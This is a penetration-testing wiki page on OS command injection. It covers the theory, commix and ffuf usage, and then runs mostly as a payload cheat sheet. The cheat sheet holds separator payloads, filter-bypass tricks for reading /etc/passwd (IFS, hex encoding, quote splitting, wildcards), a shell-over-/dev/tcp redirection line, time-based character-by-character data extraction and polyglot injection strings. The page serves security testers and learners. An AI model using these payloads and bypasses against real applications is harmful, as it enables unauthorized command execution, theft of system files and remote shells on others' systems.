# Command Injection

## Theory

Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.

In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

## Practice

### Tools

{% tabs %}
{% tab title="commix" %}
[Commix](https://github.com/commixproject/commix) (python) is a tool that automate Command Injection detection and exploitation.&#x20;

```bash
# With a request file
## Batch : do not ask for questions
## --os : specify OS if known
## -r : request file
commix -r request.req --batch --os=Unix

# Retreive all
# --all : Retrieve everything
# -u : Target URL
commix -u <TARGET_URL> --all
```
{% endtab %}
{% endtabs %}

### Fuzzing

We have to identify input vectors that may not be properly sanitized in GET and POST parameters. For this, we may fuzz parameters with following wordlists and tools.

{% tabs %}
{% tab title="Ffuf" %}
We can use ffuf and the [command-injection-commix](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/command-injection-commix.txt) or [command\_injection](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/command\_injection.txt) wordlists.

```bash
#Example
ffuf -u http://example.org?vuln=paramFUZZ -w /usr/share/seclists/Fuzzing/command-injection-commix -fs 990
```
{% endtab %}
{% endtabs %}

### Payloads

{% hint style="success" %}
In Unix-like command-line interfaces, the `--` symbol is used to signify the end of command options. After `--`, all arguments are treated as filenames and arguments, and not as options.
{% endhint %}

{% hint style="info" %}
We should try following payloads in input fields&#x20;

```
#Exemple
http://example.org?vuln=param;sleep+5
```
{% endhint %}

{% tabs %}
{% tab title="Windows & UNIX-Like" %}
Following payloads are both Unix and Windows supported

* `;` (Semicolon): Allows you to execute multiple commands sequentially.
* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
* `&` (Background): Execute the command in the background, allowing the user to continue using the shell.
* `|` (Pipe): Takes the output of the first command and uses it as the input for the second command.

```bash
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2
command1 %0A command2 # %0A (linefeed) Execute both (RECOMMENDED)

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
{% endtab %}

{% tab title="UNIX-like" %}
Following payloads are only unix supported

```bash
# Using backticks: ``
`command1`

# Using substitution: $()
$(command1)

# Might be useful
ls${LS_COLORS:10:1}${IFS}id
```
{% endtab %}
{% endtabs %}

### Filter Bypass

{% tabs %}
{% tab title="Without Space" %}
#### IFS

`$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a seperator in commands like `ls`, `wget`; use `${IFS}` instead.

```bash
cat${IFS}/etc/passwd
ls${IFS}-la
```

#### Brace expansion

In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.

```bash
{cat,/etc/passwd}
```

#### Redirection

Input redirection. The < character tells the shell to read the contents of the file specified.

```bash
cat</etc/passwd
sh</dev/tcp/127.0.0.1/4242
```

#### ANSI-C Quoting

```bash
X=$'uname\x20-a'&&$X
```

#### Tab character

The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value `09`.

```bash
;ls%09-al%09/home
```

#### Windows Operations

In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.

```powershell
ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1
```
{% endtab %}

{% tab title="Line Return" %}
Commands can be broken into parts by using backslash followed by a newline

```bash
$ cat /et\
c/pa\
sswd
```

URL encoded form would look like this:

```bash
cat%20/et%5C%0Ac/pa%5C%0Asswd
```
{% endtab %}

{% tab title="Hex encoding" %}
We may use hexadecimal encoding in order to bypass filters

```bash
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```
{% endtab %}

{% tab title="Characters Filter" %}
Commands execution without backslash and slash - linux bash

```bash
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```
{% endtab %}

{% tab title="Blacklisted words" %}
We may bypass blacklisted words as follow :

#### Bypass with single quote

```bash
w'h'o'am'i
```

#### Bypass with double quote

```bash
w"h"o"am"i
```

#### Bypass with backslash and slash

```bash
w\ho\am\i
/\b\i\n/////s\h
```

#### Bypass with $@

`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.

```bash
who$@ami
echo whoami|$0
```

#### Bypass with $()

```bash
who$()ami
who$(echo am)i
who`echo am`i
```

#### Bypass with variable expansion

```bash
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

#### Bypass with wildcards

```bash
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```
{% endtab %}
{% endtabs %}

### Data Exfiltration

{% tabs %}
{% tab title="Time based" %}
We may extract data char by char

```bash
swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
{% endtab %}

{% tab title="DNS based" %}
For DNS based exfiltration, you may see [this page](../../../redteam/exfiltration/dns.md).
{% endtab %}
{% endtabs %}

### Polyglot command injection <a href="#user-content-polyglot-command-injection" id="user-content-polyglot-command-injection"></a>

A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about "polyglot command injection," we're referring to an injection payload that can be executed in multiple contexts or environments.

{% tabs %}
{% tab title="Example 1" %}
```bash
Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# Context inside commands with single and double quote:
echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```
{% endtab %}

{% tab title="Example 2" %}
```bash
Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

# Context inside commands with single and double quote:
echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://owasp.org/www-community/attacks/Command_Injection" %}

{% embed url="https://portswigger.net/web-security/os-command-injection" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" %}
